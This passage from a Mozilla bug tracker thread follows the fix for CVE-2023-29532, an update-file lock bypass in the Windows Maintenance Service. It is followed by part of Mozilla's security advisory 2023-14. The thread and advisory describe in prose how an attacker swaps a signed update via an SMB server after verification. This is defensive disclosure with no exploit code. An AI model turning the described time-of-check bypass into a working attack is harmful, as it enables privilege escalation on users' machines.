> I have considered several possible solutions to this. I'm not excited about any of them, but I think that the best option is to load the file into RAM and rely on that not being changed rather than to rely on the version on disk not being changed.
>
> This does make me a bit nervous, particularly because this would be done during the staging process, which means that this will typically happen while Firefox is also running (and also using a whole bunch of RAM). But (a) I think that the amount of RAM that we will need is acceptable, and (b) the system will likely end up paging things to the disk anyways. Nevertheless, I want to make sure that if we fail to allocate the necessary amount of memory, we communicate that error to Firefox in such a way that we fall back to updating without staging, thus allowing us to allocate that memory when Firefox isn't running.

I agree on a) -- our MAR sizes are ~50Mb on Windows and <120Mb on macOS, IIRC.

Consider doing this in two steps: one for slurping into memory and addressing this issue, and a follow-up to do the staging fallbacks, which I expect to be more difficult to get correct and (more importantly!) test.

|  | [Nick Alexander :nalexander [he/him]](/user_profile?user_id=432887) |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=1806394#c8)• 2 years ago |
|  | |

Holger: can you bypass Windows Authenticode or macOS code signing with this attack? I guess I'm interested in what expectations various high-value systems have for the integrity of a disk. You could imagine firmware that lies about disk content depending on various of conditions, yielding different classes of attack.

Flags: needinfo?(hofusec)

|  | [Robin Steuber (she/her) [:bytesized]](/user_profile?user_id=563604)  Assignee |  |
| --- | --- | --- |
| [Comment 9](/show_bug.cgi?id=1806394#c9)• 2 years ago |
|  | |

(In reply to Nick Alexander :nalexander [he/him] from [comment #7](/show_bug.cgi?id=1806394#c7 "RESOLVED FIXED - Mar File Lock Bypass Leads to Privilege Escalation via Mozilla Maintenance Service"))

> Consider doing this in two steps: one for slurping into memory and addressing this issue, and a follow-up to do the staging fallbacks

I believe that the staging fallbacks can be done entirely out in the open (i.e. not in a security bug). Memory allocation failure codes already exist, and it already makes sense to fallback from staging to updating without staging if we cannot allocate enough memory to stage. File [Bug 1813129](/show_bug.cgi?id=1813129 "RESOLVED FIXED - Firefox should fall back if staging fails with a memory error") to do this.

|  | [Robin Steuber (she/her) [:bytesized]](/user_profile?user_id=563604)  Assignee |  |
| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=1806394#c10)• 2 years ago |
|  | |

Attached file
[Bug 1806394 r=nalexander!](attachment.cgi?id=9314925)
— [Details](attachment.cgi?id=9314925&action=edit)

|  | [Robin Steuber (she/her) [:bytesized]](/user_profile?user_id=563604)  Assignee |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=1806394#c11)• 2 years ago |
|  | |

Comment on [attachment 9314925](/attachment.cgi?id=9314925 "Bug 1806394 r=nalexander!") [[details]](/attachment.cgi?id=9314925&action=edit "Bug 1806394 r=nalexander!")

[Bug 1806394](/show_bug.cgi?id=1806394 "RESOLVED FIXED - Mar File Lock Bypass Leads to Privilege Escalation via Mozilla Maintenance Service") r=nalexander!

### Security Approval Request

* **How easily could an exploit be constructed based on the patch?**: An attacker that is aware of this type of exploit could look at this patch and could probably construct an exploit pretty easily. But I'm not sure how common of knowledge this type of exploit is. I didn't realize that you could do it, though it makes sense in retrospect.
* **Do comments in the patch, the check-in comment, or tests included in the patch paint a bulls-eye on the security problem?**: No
* **Which older supported branches are affected by this flaw?**: Probably all previous versions of Firefox are affected
* **If not all supported branches, which bug introduced the flaw?**: None
* **Do you have backports for the affected branches?**: No
* **If not, how different, hard to create, and risky will they be?**: This patch changes code that doesn't get touched often, so uplifting this would probably be trivial.
* **How likely is this patch to cause regressions; how much testing does it need?**: This patch is covered by automated testing. And I understand that we currently manually QA that updates can be applied successfully for all releases. I don't think additional testing beyond that is necessary.
* **Is Android affected?**: No
[Attachment #9314925](/attachment.cgi?id=9314925&action=edit "Bug 1806394 r=nalexander!") -
Flags: sec-approval?

|  | [Robin Steuber (she/her) [:bytesized]](/user_profile?user_id=563604)  Assignee |  |
| --- | --- | --- |
| [Comment 12](/show_bug.cgi?id=1806394#c12)• 2 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1806394&comment_id=16265996 "1 revision") |
|  | |

Note that if we do uplift this, we should really uplift [Bug 1813129](/show_bug.cgi?id=1813129 "RESOLVED FIXED - Firefox should fall back if staging fails with a memory error") as well. Which I also don't anticipate being very risky.

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1806394#a4343713_75935)• 2 years ago |

[status-firefox109](/buglist.cgi?f1=cf_status_firefox109&o1=isnotempty):
--- → [wontfix](/buglist.cgi?f1=cf_status_firefox109&o1=equals&v1=wontfix)
[status-firefox110](/buglist.cgi?f1=cf_status_firefox110&o1=isnotempty):
--- → [wontfix](/buglist.cgi?f1=cf_status_firefox110&o1=equals&v1=wontfix)
[status-firefox111](/buglist.cgi?f1=cf_status_firefox111&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox111&o1=equals&v1=affected)
[status-firefox-esr102](/buglist.cgi?f1=cf_status_firefox_esr102&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox_esr102&o1=equals&v1=affected)
[tracking-firefox111](/buglist.cgi?f1=cf_tracking_firefox111&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox111&o1=equals&v1=%2B)
[tracking-firefox-esr102](/buglist.cgi?f1=cf_tracking_firefox_esr102&o1=isnotempty):
--- → [111+](/buglist.cgi?f1=cf_tracking_firefox_esr102&o1=equals&v1=111%2B)

|  | [Robin Steuber (she/her) [:bytesized]](/user_profile?user_id=563604)  Assignee |  |
| --- | --- | --- |
| [Comment 13](/show_bug.cgi?id=1806394#c13)• 2 years ago |
|  | |

Attached patch

[Bug 1806394 ESR102 rollup.patch](attachment.cgi?id=9316657&action=diff) (obsolete)
— [Details](attachment.cgi?id=9316657&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1806394&attachment=9316657)

Rebase/rollup of the patch for this bug and also [Bug 1813129](/show_bug.cgi?id=1813129 "RESOLVED FIXED - Firefox should fall back if staging fails with a memory error"), suitable for being applied to ESR102.

ESR Approval Request Comment

[Feature/Bug causing the regression]:

N/A - Longstanding bug

[User impact if declined]:

Privilege escalation risk

[Is this code covered by automated tests?]:

MAR reading is covered by existing libmar tests. Functionality to fall back from staging on memory allocation failure has a test included in the patch.

[Has the fix been verified in Nightly?]:

Not yet - Still awaiting sec-approval. I've done a bit of manual verification on a local build.

[Needs manual test from QE? If yes, steps to reproduce]:

QA already does regular tests that updates can be applied properly, which should be the only substantial risk here.

[List of other uplifts needed for the feature/fix]:

All rolled up in this patch

[Is the change risky?]:

Medium risk

[Why is the change risky/not risky?]:

Changing the updater is inherently a bit risky since it can be hard to fix issues if the updater is broken. But while this changes the read mechanism, it doesn't change the way that the update file is actually parsed. And it is well covered by testing.

See <https://wiki.mozilla.org/Release_Management/ESR_Landing_Process> for more info.

[Attachment #9316657](/attachment.cgi?id=9316657&action=edit "Bug 1806394 ESR102 rollup.patch") -
Flags: approval-mozilla-esr102?

|  | [Robin Steuber (she/her) [:bytesized]](/user_profile?user_id=563604)  Assignee |  |
| --- | --- | --- |
| [Comment 14](/show_bug.cgi?id=1806394#c14)• 2 years ago |
|  | |

Note: I think that we should aim to land the ESR rollup as late in the next cycle as possible to maximize bake time on Nightly/Beta

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Comment 15](/show_bug.cgi?id=1806394#c15)• 2 years ago |
|  | |

Comment on [attachment 9314925](/attachment.cgi?id=9314925 "Bug 1806394 r=nalexander!") [[details]](/attachment.cgi?id=9314925&action=edit "Bug 1806394 r=nalexander!")

[Bug 1806394](/show_bug.cgi?id=1806394 "RESOLVED FIXED - Mar File Lock Bypass Leads to Privilege Escalation via Mozilla Maintenance Service") r=nalexander!

Approved to land when uplift is confirmed

[Attachment #9314925](/attachment.cgi?id=9314925&action=edit "Bug 1806394 r=nalexander!") -
Flags: sec-approval? → sec-approval+

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Comment 16](/show_bug.cgi?id=1806394#c16)• 2 years ago |
|  | |

Comment on [attachment 9316657](/attachment.cgi?id=9316657 "Bug 1806394 ESR102 rollup.patch") [[details]](/attachment.cgi?id=9316657&action=edit "Bug 1806394 ESR102 rollup.patch") [[diff]](/attachment.cgi?id=9316657&action=diff "Bug 1806394 ESR102 rollup.patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1806394&attachment=9316657)

[Bug 1806394](/show_bug.cgi?id=1806394 "RESOLVED FIXED - Mar File Lock Bypass Leads to Privilege Escalation via Mozilla Maintenance Service") ESR102 rollup.patch

Approved to land when uplift is confirmed

[Attachment #9316657](/attachment.cgi?id=9316657&action=edit "Bug 1806394 ESR102 rollup.patch") -
Flags: approval-mozilla-esr102? → approval-mozilla-esr102+

|  | [Robin Steuber (she/her) [:bytesized]](/user_profile?user_id=563604)  Assignee |  |
| --- | --- | --- |
| [Comment 17](/show_bug.cgi?id=1806394#c17)• 2 years ago |
|  | |

Talked to :tjr on Slack because I was a little confused about what was meant by this.

(In reply to Tom Ritter [:tjr] from [comment #15](/show_bug.cgi?id=1806394#c15 "RESOLVED FIXED - Mar File Lock Bypass Leads to Privilege Escalation via Mozilla Maintenance Service"))

> Approved to land when uplift is confirmed

Was told that I should remove the `approval-mozilla-esr102?` on the rollup patch, land on Nightly, and figure out later with relman later how we want to track this so that the original patch can ride the trains and the rollup gets uplifted to ESR102 when the original patch hits release.

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 18](/show_bug.cgi?id=1806394#c18)• 2 years ago |
|  | |

Are we targeting 112/102.10esr now?

Flags: needinfo?(bytesized)

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Comment 19](/show_bug.cgi?id=1806394#c19)• 2 years ago |
|  | |

Yes.

[tracking-firefox-esr102](/buglist.cgi?f1=cf_tracking_firefox_esr102&o1=isnotempty):
[111+](/buglist.cgi?f1=cf_tracking_firefox_esr102&o1=equals&v1=111%2B) → [112+](/buglist.cgi?f1=cf_tracking_firefox_esr102&o1=equals&v1=112%2B)Flags: needinfo?(bytesized)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 20](/show_bug.cgi?id=1806394#c20)• 2 years ago |
|  | |

Comment on [attachment 9316657](/attachment.cgi?id=9316657 "Bug 1806394 ESR102 rollup.patch") [[details]](/attachment.cgi?id=9316657&action=edit "Bug 1806394 ESR102 rollup.patch") [[diff]](/attachment.cgi?id=9316657&action=diff "Bug 1806394 ESR102 rollup.patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1806394&attachment=9316657)

[Bug 1806394](/show_bug.cgi?id=1806394 "RESOLVED FIXED - Mar File Lock Bypass Leads to Privilege Escalation via Mozilla Maintenance Service") ESR102 rollup.patch

Yeah, then let's re-nominate this for ESR approval once we're in that cycle. When Robin and I first discussed this, we were targeting the 102.9esr release and it made more sense to just do the nomination right away.

[Attachment #9316657](/attachment.cgi?id=9316657&action=edit "Bug 1806394 ESR102 rollup.patch") -
Flags: approval-mozilla-esr102+

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1806394#a4946514_75935)• 2 years ago |

[status-firefox111](/buglist.cgi?f1=cf_status_firefox111&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox111&o1=equals&v1=affected) → [wontfix](/buglist.cgi?f1=cf_status_firefox111&o1=equals&v1=wontfix)
[status-firefox112](/buglist.cgi?f1=cf_status_firefox112&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox112&o1=equals&v1=affected)
[tracking-firefox111](/buglist.cgi?f1=cf_tracking_firefox111&o1=isnotempty):
[+](/buglist.cgi?f1=cf_tracking_firefox111&o1=equals&v1=%2B) → ---
[tracking-firefox112](/buglist.cgi?f1=cf_tracking_firefox112&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox112&o1=equals&v1=%2B)

|  | [Sebastian Hengst [:aryx] (needinfo me if it's about an intermittent or backout)](/user_profile?user_id=258347) |  |
| --- | --- | --- |
| [Comment 21](/show_bug.cgi?id=1806394#c21)• 2 years ago |
|  | |

Landed build bustages in mar\_read.c, at least on macOS: <https://hg.mozilla.org/integration/autoland/rev/14fbd3cca8aaa0987fb2f6da635228f2ee59b6ce>

Backed out <https://hg.mozilla.org/integration/autoland/rev/1338c768e5740fb18d6bb90137797d0c0211bff0>

Push with failures: <https://treeherder.mozilla.org/jobs?repo=autoland&group_state=expanded&resultStatus=testfailed%2Cbusted%2Cexception%2Cretry%2Cusercancel&revision=14fbd3cca8aaa0987fb2f6da635228f2ee59b6ce&selectedTaskRun=A3RTfpYxQOuaTGLpYTSQGQ.0>

Failure log: <https://treeherder.mozilla.org/logviewer?job_id=405628313&repo=autoland>

```
/builds/worker/checkouts/gecko/modules/libmar/src/mar_read.c:238:64: error: format specifies type 'long' but the argument has type 'off_t' (aka 'long long') [-Werror,-Wformat]
/builds/worker/checkouts/gecko/modules/libmar/src/mar_read.c:251:66: error: format specifies type 'long' but the argument has type 'off_t' (aka 'long long') [-Werror,-Wformat]

```
Flags: needinfo?(bytesized)

|  | [Robin Steuber (she/her) [:bytesized]](/user_profile?user_id=563604)  Assignee |  |
| --- | --- | --- |
| [Comment 22](/show_bug.cgi?id=1806394#c22)• 2 years ago |
|  | |

Gah, so annoying. Apparently `off_t` has a different size on macOS and Windows so they use different `printf` format specifiers. Using `#ifdef` just to change a format specifier seems ridiculous, so I'll just explicitly cast the value to the larger of the sizes so we can use a consistent format specifier.

Flags: needinfo?(bytesized)

|  | [Robin Steuber (she/her) [:bytesized]](/user_profile?user_id=563604)  Assignee |  |
| --- | --- | --- |
| [Comment 23](/show_bug.cgi?id=1806394#c23)• 2 years ago |
|  | |

Attached patch

[Bug 1806394 ESR102 rollup.patch](attachment.cgi?id=9318233&action=diff)
— [Details](attachment.cgi?id=9318233&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1806394&attachment=9318233)

[Attachment #9316657](/attachment.cgi?id=9316657&action=edit "Bug 1806394 ESR102 rollup.patch") -
Attachment is obsolete: true

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 24](/show_bug.cgi?id=1806394#c24)• 2 years ago |
|  | |

<https://hg.mozilla.org/mozilla-central/rev/95743a6fc0e8>

Group: firefox-core-security → core-security-releaseStatus: NEW → RESOLVEDClosed: 2 years ago
[status-firefox112](/buglist.cgi?f1=cf_status_firefox112&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox112&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox112&o1=equals&v1=fixed)Resolution: --- → FIXEDTarget Milestone: --- → 112 Branch

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1806394#a5555085_1689)• 2 years ago |

Flags: sec-bounty? → sec-bounty+

|  | [Brindusa Tot, Desktop QA](/user_profile?user_id=553429) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1806394#a6656675_553429)• 2 years ago |

Flags: qe-verify-Whiteboard: enterprisey → enterprisey [post-critsmash-triage]

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 25](/show_bug.cgi?id=1806394#c25)• 2 years ago |
|  | |

We're about halfway through the Beta cycle now and I'm not aware of any fallout from this change. Are we feeling good about the ESR request?

Flags: needinfo?(bytesized)

|  | [Robin Steuber (she/her) [:bytesized]](/user_profile?user_id=563604)  Assignee |  |
| --- | --- | --- |
| [Comment 26](/show_bug.cgi?id=1806394#c26)• 2 years ago |
|  | |

Yes, I'm satisfied that it should be safe to land.

Flags: needinfo?(bytesized)

|  | [Robin Steuber (she/her) [:bytesized]](/user_profile?user_id=563604)  Assignee |  |
| --- | --- | --- |
| [Comment 27](/show_bug.cgi?id=1806394#c27)• 2 years ago |
|  | |

Comment on [attachment 9318233](/attachment.cgi?id=9318233 "Bug 1806394 ESR102 rollup.patch") [[details]](/attachment.cgi?id=9318233&action=edit "Bug 1806394 ESR102 rollup.patch") [[diff]](/attachment.cgi?id=9318233&action=diff "Bug 1806394 ESR102 rollup.patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1806394&attachment=9318233)

[Bug 1806394](/show_bug.cgi?id=1806394 "RESOLVED FIXED - Mar File Lock Bypass Leads to Privilege Escalation via Mozilla Maintenance Service") ESR102 rollup.patch

### ESR Uplift Approval Request

* **If this is not a sec:{high,crit} bug, please state case for ESR consideration**: N/A - Longstanding bug
* **User impact if declined**: Privilege escalation risk
* **Fix Landed on Version**: 112
* **Risk to taking this patch**: Medium
* **Why is the change risky/not risky? (and alternatives if risky)**: Changing the updater is inherently a bit risky since it can be hard to fix issues if the updater is broken. But while this changes the read mechanism, it doesn't change the way that the update file is actually parsed. And it is well covered by testing and hasn't shown any issues on Nightly or Beta.
[Attachment #9318233](/attachment.cgi?id=9318233&action=edit "Bug 1806394 ESR102 rollup.patch") -
Flags: approval-mozilla-esr102?

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 28](/show_bug.cgi?id=1806394#c28)• 2 years ago |
|  | |

Comment on [attachment 9318233](/attachment.cgi?id=9318233 "Bug 1806394 ESR102 rollup.patch") [[details]](/attachment.cgi?id=9318233&action=edit "Bug 1806394 ESR102 rollup.patch") [[diff]](/attachment.cgi?id=9318233&action=diff "Bug 1806394 ESR102 rollup.patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1806394&attachment=9318233)

[Bug 1806394](/show_bug.cgi?id=1806394 "RESOLVED FIXED - Mar File Lock Bypass Leads to Privilege Escalation via Mozilla Maintenance Service") ESR102 rollup.patch

Approved for 102.10esr.

[Attachment #9318233](/attachment.cgi?id=9318233&action=edit "Bug 1806394 ESR102 rollup.patch") -
Flags: approval-mozilla-esr102? → approval-mozilla-esr102+

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 29](/show_bug.cgi?id=1806394#c29)• 2 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1806394&comment_id=16345684 "1 revision") |
| uplift | |

<https://hg.mozilla.org/releases/mozilla-esr102/rev/532ab04738eb>

<https://hg.mozilla.org/releases/mozilla-esr102/rev/d8a4e4edf342>

[status-firefox-esr102](/buglist.cgi?f1=cf_status_firefox_esr102&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox_esr102&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox_esr102&o1=equals&v1=fixed)

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1806394#a9253342_578488)• 2 years ago |

Whiteboard: enterprisey [post-critsmash-triage] → enterprisey [post-critsmash-triage][adv-main112+]

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1806394#a9255048_578488)• 2 years ago |

Whiteboard: enterprisey [post-critsmash-triage][adv-main112+] → enterprisey [post-critsmash-triage][adv-main112+][adv-esr102.10+]

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Comment 30](/show_bug.cgi?id=1806394#c30)• 2 years ago |
|  | |

Attached file
[advisory.txt](attachment.cgi?id=9327547)
— [Details](attachment.cgi?id=9327547&action=edit)

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1806394#a9444062_578488)• 2 years ago |

Alias: CVE-2023-29532

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1806394#a26147666_1689)• 1 year ago |

Group: core-security-release

|  | [David Lawrence [:dkl]](/user_profile?user_id=5898) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1806394#a45639239_5898)• 8 months ago |

Keywords: [reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---)
You need to [log in](/show_bug.cgi?id=1806394&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [Holger Fuhrmannek](/user_profile?user_id=436533)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review



=== Content from www.mozilla.org_4d973e86_20250114_221425.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2023-14

## Security Vulnerabilities fixed in Firefox ESR 102.10

Announced
April 11, 2023
Impact
high
Products
Firefox ESR
Fixed in

* Firefox ESR 102.10

#### [#CVE-2023-29531: Out-of-bound memory access in WebGL on macOS](#CVE-2023-29531)

Reporter
DoHyun Lee
Impact
high
##### Description

An attacker could have caused an out of bounds memory access using WebGL APIs, leading to memory corruption and a potentially exploitable crash.
*This bug only affects Firefox for macOS. Other operating systems are unaffected.*

##### References

* [Bug 1794292](https://bugzilla.mozilla.org/show_bug.cgi?id=1794292)

#### [#CVE-2023-29532: Mozilla Maintenance Service Write-lock bypass](#CVE-2023-29532)

Reporter
Holger Fuhrmannek
Impact
high
##### Description

A local attacker can trick the Mozilla Maintenance Service into applying an unsigned update file by pointing the service at an update file on a malicious SMB server. The update file can be replaced after the signature check, before the use, because the write-lock requested by the service does not work on a SMB server.
*Note: This attack requires local system access and only affects Windows. Other operating systems are not affected.*

##### References

* [Bug 1806394](https://bugzilla.mozilla.org/show_bug.cgi?id=1806394)

#### [#CVE-2023-29533: Fullscreen notification obscured](#CVE-2023-29533)

Reporter
Irvan Kurniawan
Impact
high
##### Description

A website could have obscured the fullscreen notification by using a combination of `window.open`, fullscreen requests, `window.name` assignments, and `setInterval` calls. This could have led to user confusion and possible spoofing attacks.

##### References

* [Bug 1814597](https://bugzilla.mozilla.org/show_bug.cgi?id=1814597)
* [Bug 1798219](https://bugzilla.mozilla.org/show_bug.cgi?id=1798219)

#### [#CVE-2023-1999: Double-free in libwebp](#CVE-2023-1999)

Reporter
Irvan Kurniawan
Impact
high
##### Description

A double-free in libwebp could have led to memory corruption and a potentially exploitable crash.

##### References

* [Bug 1819244](https://bugzilla.mozilla.org/show_bug.cgi?id=1819244)

#### [#CVE-2023-29535: Potential Memory Corruption following Garbage Collector compaction](#CVE-2023-29535)

Reporter
Lukas Bernhard
Impact
high
##### Description

Following a Garbage Collector compaction, weak maps may have been accessed before they were correctly traced. This resulted in memory corruption and a potentially exploitable crash.

##### References

* [Bug 1820543](https://bugzilla.mozilla.org/show_bug.cgi?id=1820543)

#### [#CVE-2023-29536: Invalid free from JavaScript code](#CVE-2023-29536)

Reporter
zx from qriousec
Impact
high
##### Description

An attacker could cause the memory manager to incorrectly free a pointer that addresses attacker-controlled memory, resulting in an assertion, memory corruption, or a potentially exploitable crash.

##### References

* [Bug 1821959](https://bugzilla.mozilla.org/show_bug.cgi?id=1821959)

#### [#CVE-2023-29539: Content-Disposition filename truncation leads to Reflected File Download](#CVE-2023-29539)

Reporter
Trung Pham
Impact
moderate
##### Description

When handling the filename directive in the Content-Disposition header, the filename would be truncated if the filename contained a NULL character. This could have led to reflected file download attacks potentially tricking users to install malware.

##### References

* [Bug 1784348](https://bugzilla.mozilla.org/show_bug.cgi?id=1784348)

#### [#CVE-2023-29541: Files with malicious extensions could have been downloaded unsafely on Linux](#CVE-2023-29541)

Reporter
Ameen Basha M K
Impact
moderate
##### Description

Firefox did not properly handle downloads of files ending in `.desktop`, which can be interpreted to run attacker-controlled commands.
*This bug only affects Firefox for Linux on certain Distributions. Other operating systems are unaffected, and Mozilla is unable to enumerate all affected Linux Distributions.*

##### References

* [Bug 1810191](https://bugzilla.mozilla.org/show_bug.cgi?id=1810191)

#### [#CVE-2023-29542: Bypass of file download extension restrictions](#CVE-2023-29542)

Reporter
Shaheen Fazim and Ameen Basha M K
Impact
moderate
##### Description

A newline in a filename could have been used to bypass the file extension security mechanisms that replace malicious file extensions such as .lnk with .download. This could have led to accidental execution of malicious code.
*This bug only affects Firefox on Windows. Other versions of Firefox are unaffected.*

##### References

* [Bug 1815062](https://bugzilla.mozilla.org/show_bug.cgi?id=1815062)
* [Bug 1810793](https://bugzilla.mozilla.org/show_bug.cgi?id=1810793)

#### [#CVE-2023-29545: Windows Save As dialog resolved environment variables](#CVE-2023-29545)

Reporter
Axel Chong (@Haxatron)
Impact
moderate
##### Description

Similar to CVE-2023-28163, this time when choosing 'Save Link As', suggested filenames containing environment variable names would have resolved those in the context of the current user.
*This bug only affects Firefox on Windows. Other versions of Firefox are unaffected.*

##### References

* [Bug 1823077](https://bugzilla.mozilla.org/show_bug.cgi?id=1823077)

#### [#CVE-2023-1945: Memory Corruption in Safe Browsing Code](#CVE-2023-1945)

Reporter
Gabriele Svelto
Impact
moderate
##### Description

Unexpected data returned from the Safe Browsing API could have led to memory corruption and a potentially exploitable crash.

##### References

